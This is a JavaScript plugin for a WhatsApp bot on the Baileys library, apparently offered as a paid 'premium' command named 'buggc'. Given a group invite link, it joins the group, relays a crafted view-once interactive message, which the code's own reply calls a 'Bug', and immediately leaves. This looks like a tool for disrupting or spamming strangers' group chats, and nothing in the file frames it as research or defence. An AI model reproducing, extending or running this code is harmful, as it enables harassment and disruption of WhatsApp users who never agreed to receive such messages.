
import moment from 'moment-timezone'
let time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
let salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = (await import('@adiwajshing/baileys')).default

let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
let handler = async (m, { conn, text, command, usedPrefix }) => {

if (!text) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} https://chat.whatsapp.com/xxxxxx`, m)
let [_, code] = text.match(linkRegex) || []
if (!code) return conn.reply(m.chat, `Example: ${usedPrefix + command} https://chat.whatsapp.com/xxxxxx`, m)
if (text == "https://chat.whatsapp.com/DLPvZVjQIi42UzauaaUhNk") return conn.reply(m.chat, 'Tidak bisa spam ke group ini', m)
let reza = await conn.groupAcceptInvite(code)
 let msg = generateWAMessageFromContent(reza, {
  viewOnceMessage: {
    message: {
      "messageContextInfo": {
        "deviceListMetadata": {},
        "deviceListMetadataVersion": 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: wm
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: wm
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...null,
          title: null,
          subtitle: "EzaBot",
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
                "name": "quick_reply",
                "buttonParamsJson": `{\`display_text\`:\`INFO GROUP\`,\`id\`:\`.infogc\`}`
              },
          ],
        })
      })
    }
  }
}, { quoted: m });
await conn.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
await sleep(1000)
await conn.reply(m.chat, `*Sukses mengirim Bug Tolong Jeda 3 Menit Yah*`, m)
await conn.groupLeave(reza)
}
handler.help = ['buggc *<link>*']
handler.tags = ['premium']
handler.premium = true
handler.command = /^(buggc)$/i

export default handler
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}